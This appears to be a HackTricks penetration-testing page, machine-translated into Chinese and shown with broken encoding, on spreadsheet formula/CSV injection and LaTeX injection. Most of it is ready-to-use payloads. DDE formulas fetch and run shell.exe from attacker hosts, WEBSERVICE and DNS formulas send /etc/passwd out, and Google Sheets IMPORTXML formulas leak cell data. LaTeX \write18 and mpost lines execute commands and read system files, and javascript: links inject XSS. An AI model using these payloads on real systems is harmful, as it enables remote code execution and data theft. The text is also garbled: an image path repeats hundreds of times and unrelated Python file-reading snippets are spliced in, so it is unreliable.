# å…¬å¼/CSV/æ–‡æ¡£/LaTeXæ³¨å…¥

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## å…¬å¼æ³¨å…¥

### ä¿¡æ¯

å¦‚æœæ‚¨çš„**è¾“å…¥**è¢«**åå°„**åˆ°**CSVæ–‡ä»¶**ï¼ˆæˆ–ä»»ä½•å…¶ä»–å¯èƒ½è¢«**Excel**æ‰“å¼€çš„æ–‡ä»¶ï¼‰ä¸­ï¼Œæ‚¨å¯èƒ½å¯ä»¥æ”¾ç½®Excel**å…¬å¼**ï¼Œå½“ç”¨æˆ·**æ‰“å¼€æ–‡ä»¶**æˆ–ç”¨æˆ·**åœ¨Excelè¡¨æ ¼ä¸­ç‚¹å‡»æŸä¸ªé“¾æ¥**æ—¶ï¼Œè¿™äº›å…¬å¼å°†è¢«**æ‰§è¡Œ**ã€‚

{% hint style="danger" %}
ç°åœ¨çš„**Excelä¼šè­¦å‘Š**ï¼ˆå¤šæ¬¡ï¼‰**ç”¨æˆ·å½“ä»Excelå¤–éƒ¨åŠ è½½å†…å®¹æ—¶**ï¼Œä»¥é˜²æ­¢ä»–è¿›è¡Œæ¶æ„æ“ä½œã€‚å› æ­¤ï¼Œå¿…é¡»å¯¹ç¤¾ä¼šå·¥ç¨‹å­¦è¿›è¡Œç‰¹æ®ŠåŠªåŠ›ä»¥è·å¾—æœ€ç»ˆæœ‰æ•ˆè½½è·ã€‚
{% endhint %}

### [å­—å…¸](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### è¶…é“¾æ¥

**ä»¥ä¸‹ç¤ºä¾‹éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥ä»æœ€ç»ˆçš„Excelè¡¨ä¸­çªƒå–å†…å®¹å¹¶å‘ä»»æ„ä½ç½®å‘é€è¯·æ±‚ã€‚ä½†æ˜¯éœ€è¦ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼ˆå¹¶æ¥å—è­¦å‘Šæç¤ºï¼‰ã€‚**

ç¤ºä¾‹æ¥è‡ª[https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

è®©æˆ‘ä»¬å‡è®¾ä¸€ä¸ªå­¦æ ¡çš„å­¦ç”Ÿè®°å½•ç®¡ç†ç³»ç»Ÿçš„æ”»å‡»åœºæ™¯ã€‚è¯¥åº”ç”¨ç¨‹åºå…è®¸æ•™å¸ˆè¾“å…¥å­¦ç”Ÿçš„è¯¦ç»†ä¿¡æ¯ã€‚æ”»å‡»è€…è·å¾—äº†å¯¹åº”ç”¨ç¨‹åºçš„è®¿é—®æƒé™ï¼Œå¹¶å¸Œæœ›æ‰€æœ‰ä½¿ç”¨è¯¥åº”ç”¨ç¨‹åºçš„æ•™å¸ˆéƒ½å—åˆ°å¨èƒã€‚å› æ­¤ï¼Œæ”»å‡»è€…å°è¯•é€šè¿‡Webåº”ç”¨ç¨‹åºæ‰§è¡ŒCSVæ³¨å…¥æ”»å‡»ã€‚\
æ”»å‡»è€…éœ€è¦çªƒå–å…¶ä»–å­¦ç”Ÿçš„è¯¦ç»†ä¿¡æ¯ã€‚å› æ­¤ï¼Œæ”»å‡»è€…åœ¨è¾“å…¥å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯æ—¶ä½¿ç”¨äº†è¶…é“¾æ¥å…¬å¼ã€‚

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

å½“æ•™å¸ˆå¯¼å‡ºCSVå¹¶ç‚¹å‡»è¶…é“¾æ¥æ—¶ï¼Œæ•æ„Ÿæ•°æ®å°†è¢«å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

å¯¼å‡ºçš„CSVæ–‡ä»¶ä¸­åŒ…å«æ¶æ„æœ‰æ•ˆè´Ÿè½½ã€‚

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

å­¦ç”Ÿè¯¦ç»†ä¿¡æ¯è¢«è®°å½•åœ¨æ”»å‡»è€…çš„WebæœåŠ¡å™¨ä¸­ã€‚

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

ä¸ºäº†ä½¿æ­¤ç¤ºä¾‹å·¥ä½œï¼Œ**éœ€è¦å¯ç”¨ä»¥ä¸‹é…ç½®**ï¼š\
æ–‡ä»¶ â†’ é€‰é¡¹ â†’ ä¿¡ä»»ä¸­å¿ƒ â†’ ä¿¡ä»»ä¸­å¿ƒè®¾ç½® â†’ å¤–éƒ¨å†…å®¹ â†’ å¯ç”¨åŠ¨æ€æ•°æ®äº¤æ¢æœåŠ¡å™¨å¯åŠ¨\
æˆ–ä½¿ç”¨**æ—§ç‰ˆæœ¬çš„Excel**ã€‚

å¥½æ¶ˆæ¯æ˜¯ï¼Œ**å½“æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œæ­¤æœ‰æ•ˆè´Ÿè½½ä¼šè‡ªåŠ¨æ‰§è¡Œ**ï¼ˆå¦‚æœç”¨æˆ·æ¥å—è­¦å‘Šï¼‰ã€‚

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½æ‰§è¡Œè®¡ç®—å™¨ **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* è¿™å°†ä»æœ¬åœ°çš„/etc/passwdæ–‡ä»¶ä¸­è¯»å–ç¬¬ä¸€è¡Œï¼š`='file:///etc/passwd'#$passwd.A1`
* å°†å…¶å¤–æ³„ï¼š`=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* å¤–æ³„å¤šè¡Œï¼š`=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNSå¤–æ³„ï¼š`=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**åˆ†æDNSå¤–æ³„è´Ÿè½½ï¼š**

* â€˜file:///etc/passwdâ€™#$passwd.A19 â€“ å°†ä»æœ¬åœ°çš„/etc/passwdæ–‡ä»¶ä¸­è¯»å–ç¬¬19è¡Œ
* ENCODEURL(â€˜file:///etc/passwdâ€™#$passwd.A19) â€“ å¯¹è¿”å›çš„æ•°æ®è¿›è¡ŒURLç¼–ç 
* MID((ENCODEURL(â€˜file:///etc/passwdâ€™#$passwd.A19)),1,41) â€“ ç±»ä¼¼äºå­å­—ç¬¦ä¸²ï¼Œä»ç¬¬ä¸€ä¸ªå­—ç¬¦åˆ°ç¬¬41ä¸ªå­—ç¬¦è¯»å–æ•°æ®ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸æ–¹ä¾¿çš„é™åˆ¶DNSä¸»æœºåé•¿åº¦çš„æ–¹æ³•ï¼ˆFQDNçš„å­—ç¬¦é™åˆ¶ä¸º254ä¸ªå­—ç¬¦ï¼Œæ ‡ç­¾çš„å­—ç¬¦é™åˆ¶ä¸º63ä¸ªå­—ç¬¦ï¼Œå³å­åŸŸåï¼‰
* SUBSTITUTE(MID((ENCODEURL(â€˜file:///etc/passwdâ€™#$passwd.A19)),1,41),â€%â€,â€-â€œ) â€“ å°†æ‰€æœ‰%ï¼ˆURLç¼–ç çš„ç‰¹æ®Šå­—ç¬¦ï¼‰çš„å®ä¾‹æ›¿æ¢ä¸ºç ´æŠ˜å·ï¼Œä»¥ç¡®ä¿åªä½¿ç”¨æœ‰æ•ˆçš„DNSå­—ç¬¦
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(â€˜file:///etc/passwdâ€™#$passwd.A19)),1,41),â€%â€,â€-â€œ)),â€.\<FQDN>â€) â€“ å°†æ–‡ä»¶çš„è¾“å‡ºï¼ˆåœ¨è¿›è¡Œä¸Šè¿°å¤„ç†åï¼‰ä¸FQDNï¼ˆæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„åŸŸçš„æƒå¨ä¸»æœºï¼‰è¿æ¥èµ·æ¥
* WEBSERVICE â€“ å°†è¯·æ±‚æ­¤ä¸å­˜åœ¨çš„DNSåç§°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥è§£æDNSæƒå¨åç§°æœåŠ¡å™¨ä¸Šçš„æ—¥å¿—ï¼ˆæˆ–è¿è¡Œtcpdumpç­‰ï¼‰ï¼Œè€Œæˆ‘ä»¬å¯¹è¯¥æœåŠ¡å™¨å…·æœ‰æ§åˆ¶æƒ

### Google Sheets OOBæ•°æ®å¤–æ³„

é¦–å…ˆï¼Œè®©æˆ‘ä»¬ä»‹ç»ä¸€äº›æ›´æœ‰è¶£çš„å‡½æ•°ã€‚

**CONCATENATE**: å°†å­—ç¬¦ä¸²è¿æ¥åœ¨ä¸€èµ·ã€‚
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: ä»å„ç§ç»“æ„åŒ–æ•°æ®ç±»å‹ä¸­å¯¼å…¥æ•°æ®ï¼ŒåŒ…æ‹¬XMLã€HTMLã€CSVã€TSVä»¥åŠRSSå’ŒATOM XMLè®¢é˜…æºã€‚
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: å¯¼å…¥ä¸€ä¸ªRSSæˆ–ATOMè®¢é˜…æºã€‚
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: ä»HTMLé¡µé¢ä¸­å¯¼å…¥è¡¨æ ¼æˆ–åˆ—è¡¨ä¸­çš„æ•°æ®ã€‚
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: ä»æŒ‡å®šçš„ç”µå­è¡¨æ ¼ä¸­å¯¼å…¥ä¸€ç³»åˆ—å•å…ƒæ ¼ã€‚
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**å›¾ç‰‡**ï¼šå°†å›¾ç‰‡æ’å…¥åˆ°å•å…ƒæ ¼ä¸­ã€‚
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## LaTeXæ³¨å…¥

é€šå¸¸åœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ°çš„å°†LaTeXä»£ç è½¬æ¢ä¸ºPDFçš„æœåŠ¡å™¨ä½¿ç”¨`pdflatex`ã€‚\
è¯¥ç¨‹åºä½¿ç”¨3ä¸ªä¸»è¦å±æ€§æ¥ï¼ˆç¦æ­¢ï¼‰å…è®¸å‘½ä»¤æ‰§è¡Œï¼š

- `--no-shell-escape`ï¼šå³ä½¿åœ¨texmf.cnfæ–‡ä»¶ä¸­å¯ç”¨äº†`\write18{command}`æ„é€ ï¼Œä¹Ÿä¼š**ç¦ç”¨**å®ƒã€‚
- `--shell-restricted`ï¼šä¸`--shell-escape`ç›¸åŒï¼Œä½†ä»…é™äºä¸€ç»„**é¢„å®šä¹‰**çš„â€œå®‰å…¨â€å‘½ä»¤ï¼ˆåœ¨Ubuntu 16.04ä¸Šï¼Œåˆ—è¡¨ä½äº`/usr/share/texmf/web2c/texmf.cnf`ä¸­ï¼‰ã€‚
- `--shell-escape`ï¼šå¯ç”¨`\write18{command}`æ„é€ ã€‚è¯¥å‘½ä»¤å¯ä»¥æ˜¯ä»»ä½•shellå‘½ä»¤ã€‚å‡ºäºå®‰å…¨åŸå› ï¼Œé€šå¸¸ç¦æ­¢ä½¿ç”¨æ­¤æ„é€ ã€‚

ç„¶è€Œï¼Œè¿˜æœ‰å…¶ä»–æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼Œå› æ­¤ä¸ºäº†é¿å…è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ï¼Œä½¿ç”¨`--shell-restricted`éå¸¸é‡è¦ã€‚

### è¯»å–æ–‡ä»¶ <a href="#read-file" id="read-file"></a>

æ‚¨å¯èƒ½éœ€è¦ä½¿ç”¨\[æˆ–$ç­‰åŒ…è£…å™¨æ¥è°ƒæ•´æ³¨å…¥ã€‚
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### è¯»å–å•è¡Œæ–‡ä»¶

To read a single line from a file, you can use the `readline()` function in Python. This function reads one line at a time from the file and returns it as a string.

```python
file = open('filename.txt', 'r')
line = file.readline()
print(line)
file.close()
```

The code above opens the file `filename.txt` in read mode (`'r'`), reads the first line using `readline()`, and then prints the line. Finally, the file is closed using the `close()` method.

You can replace `'filename.txt'` with the path to your desired file.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### è¯»å–å¤šè¡Œæ–‡ä»¶

To read a file that contains multiple lines, you can use the following code:

è¦è¯»å–åŒ…å«å¤šè¡Œçš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š

```python
with open('file.txt', 'r') as file:
    lines = file.readlines()
    for line in lines:
        print(line.strip())
```

This code opens the file named `file.txt` in read mode (`'r'`) and uses the `readlines()` method to read all the lines in the file. The lines are then printed one by one using a loop. The `strip()` method is used to remove any leading or trailing whitespace from each line.

è¿™æ®µä»£ç ä»¥è¯»å–æ¨¡å¼ï¼ˆ`'r'`ï¼‰æ‰“å¼€åä¸º `file.txt` çš„æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ `readlines()` æ–¹æ³•è¯»å–æ–‡ä»¶ä¸­çš„æ‰€æœ‰è¡Œã€‚ç„¶åä½¿ç”¨å¾ªç¯é€è¡Œæ‰“å°è¿™äº›è¡Œã€‚`strip()` æ–¹æ³•ç”¨äºåˆ é™¤æ¯è¡Œå¼€å¤´å’Œç»“å°¾çš„ç©ºç™½å­—ç¬¦ã€‚

By using this code, you can easily read and process files that contain multiple lines of text.

ä½¿ç”¨è¿™æ®µä»£ç ï¼Œæ‚¨å¯ä»¥è½»æ¾è¯»å–å’Œå¤„ç†åŒ…å«å¤šè¡Œæ–‡æœ¬çš„æ–‡ä»¶ã€‚
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### å†™å…¥æ–‡ä»¶ <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### å‘½ä»¤æ‰§è¡Œ <a href="#command-execution" id="command-execution"></a>

å‘½ä»¤çš„è¾“å…¥å°†è¢«é‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥(stdin)ï¼Œä½¿ç”¨ä¸´æ—¶æ–‡ä»¶æ¥è·å–å®ƒã€‚
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
å¦‚æœé‡åˆ°ä»»ä½•LaTexé”™è¯¯ï¼Œè¯·è€ƒè™‘ä½¿ç”¨base64æ¥è·å–ç»“æœï¼Œä»¥é¿å…ä¸è‰¯å­—ç¬¦çš„å½±å“ã€‚
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### è·¨ç«™è„šæœ¬æ”»å‡» <a href="#cross-site-scripting" id="cross-site-scripting"></a>

æ¥è‡ª[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)çš„ä¿¡æ¯
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## å‚è€ƒèµ„æ–™

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
